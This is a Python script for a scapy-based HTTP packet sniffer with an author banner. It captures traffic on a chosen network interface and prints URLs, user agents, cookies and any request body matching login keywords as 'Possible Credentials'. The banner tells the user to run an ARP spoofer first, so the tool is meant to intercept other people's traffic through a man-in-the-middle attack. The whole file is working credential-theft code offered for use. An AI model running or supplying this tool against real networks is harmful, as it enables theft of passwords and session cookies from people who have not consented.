import scapy.all as scapy
from scapy.layers import http
import optparse


def arguments():
    arguments = optparse.OptionParser()
    arguments.add_option("-i", "--interface", metavar='\b', dest="interface", help="specify the interface the packets are flowing through")
    values, options = arguments.parse_args()
    if not values.interface:
        arguments.error("give arguments\n[+]Help: python3 packet_sniffer.py -h")
    return values


def sniff(interface):
        scapy.sniff(iface=interface, store=False, prn=print_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path


def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = (packet[scapy.Raw].load).decode()
        keywords = ["username", "password", "uname", "pass", "login", "user", "Uname"]
        for i in keywords:
            if i in load:
                return load


def get_User_Agent(packet):
    return packet[http.HTTPRequest].User_Agent


def get_Cookie(packet):
    return packet[http.HTTPRequest].Cookie


def print_packet(packet):
    try:
        if packet.haslayer(http.HTTPRequest):
            url = get_url(packet)
            if url:
                print("[+]URL: "+url.decode())
            credentials = get_credentials(packet)
            if credentials:
                print("\n[+]Possible Credentials: "+credentials+"\n")
            User_Agent = get_User_Agent(packet)
            if User_Agent:
                print("[+]User_Agent: "+User_Agent.decode())
            Cookie = get_Cookie(packet)
            if Cookie:
                print("[+]Cookie: "+Cookie.decode())
            print("-----------------------------------------------------------------------------------------------------------")
    except UnicodeDecodeError:
        pass


print("\nPacket Sniffer coded by @koushikk11\n")
print("Github: koushikfs")
print("Date:26/06/2021\n")
print("This script snifs the packets flowing through the interface given and prints URL, Possible Credentials, User_agent and Cookies\n* Make sure ARP spoofer is running before running this script\n")
values = arguments()
sniff(values.interface)
